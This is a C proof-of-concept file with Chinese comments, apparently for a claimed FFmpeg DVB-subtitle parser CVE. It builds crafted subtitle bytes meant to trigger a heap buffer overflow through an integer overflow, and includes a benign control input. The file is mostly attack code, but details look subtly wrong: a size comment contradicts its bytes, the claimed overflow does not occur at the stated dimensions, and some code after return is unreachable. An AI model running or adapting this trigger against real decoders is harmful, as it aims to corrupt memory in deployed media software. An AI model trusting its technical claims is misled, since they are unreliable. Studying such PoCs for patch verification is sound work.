/*
 * CVE-2026-70628 运行验证 PoC — dvbsub_parser 三数相加容量守卫有符号溢出
 *
 * 缺陷：dvbsub_parser.c:106 三数相加 (w*h + stride + sizeof) 可能溢出 int32 → 分配不足 → 堆越界写
 * 上游修复：FFmpeg 93f2a525 (2026-07-22) 改为逐项安全检查
 * 等价性：OH third_party_ffmpeg (0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_dvbsub trigger|control
 *   trigger: 构造 DVB 字幕分段：声明超大宽×高 + 正常 stride → 溢出后小分配 → 写越界
 *   control: 正常尺寸 DVB 字幕分段
 * 判读：ASan 原版 trigger ASan heap-buffer-overflow；补丁版 trigger 安全拒绝（EINVAL）；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/mem.h>



static int run_dvbsub(const uint8_t *data, int size)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_DVB_SUBTITLE);
    if (!codec) { fprintf(stderr, "decoder not found\n"); return 1; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 2;
    if (avcodec_open2(ctx, codec, NULL) < 0) return 3;

    AVPacket *pkt = av_packet_alloc();
    pkt->data = (uint8_t *)data;
    pkt->size = size;
    int ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0 && ret != AVERROR(EAGAIN)) {
        fprintf(stderr, "send_packet: %s\n", av_err2str(ret));
    }
    AVFrame *frame = av_frame_alloc();
    while (avcodec_receive_frame(ctx, frame) >= 0) {
        fprintf(stdout, "decoded frame: %dx%d fmt=%d\n",
                frame->width, frame->height, frame->format);
        av_frame_unref(frame);
    }
    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

        /* DVB subtitle PES: segment header + display definition + region */
    uint8_t trigger_data[] = {
        0x0F, 0x14, /* display definition segment */
        0x40,       /* clock flag + aspect flag */
        0x7F, 0xFF, /* width=32767 */
        0x7F, 0xFF, /* height=32767 */
        0x0F, 0x11, /* region segment */
        0x00,       /* region id */
        0xFF,       /* version */
        0x7F, 0xFF, /* width */
        0x7F, 0xFF, /* height */
        0x00, 0x0F, /* region depth */
        /* CLUT + object data follows to force allocation and write */
        0x0F, 0x13, 0x00, 0x00, 0x00, /* CLUT segment */
        0x0F, 0x15, 0x00, 0x00,       /* object segment */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* pixel data overflow payload */
    };
    uint8_t control_data[] = {
        0x0F, 0x14, 0x40, 0x01, 0xE0, 0x00, 0x78, /* 720x576 */
        0xFF,
    };
    const uint8_t *data = is_trigger ? trigger_data : control_data;
    int size = is_trigger ? sizeof(trigger_data) : sizeof(control_data);
    return run_dvbsub(data, size);

    fflush(stdout);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}
